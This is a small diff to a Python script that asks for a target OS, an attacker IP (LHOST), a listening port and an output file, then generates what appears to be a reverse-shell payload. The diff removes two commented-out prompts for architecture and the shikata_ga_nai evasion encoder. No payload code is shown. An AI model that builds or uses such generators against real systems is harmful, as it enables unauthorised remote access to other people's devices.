@@ -17,8 +17,6 @@ def main():
     platform = input("Select target OS: android | windows | linux: ").lower()
     lhost = input("LHOST (your IP): ").strip()
     lport = input("LPORT (listening port): ").strip()
-    #arch = input("Architecture (x86 | x64): ").strip()
-   # encoder = input("Encoder (e.g., x86 | shikata_ga_nai): ").strip()
     outfile = input("Output file name (no extension): ").strip()
 
     payload, outformat = generate_payload(platform, lhost, lport, outfile)
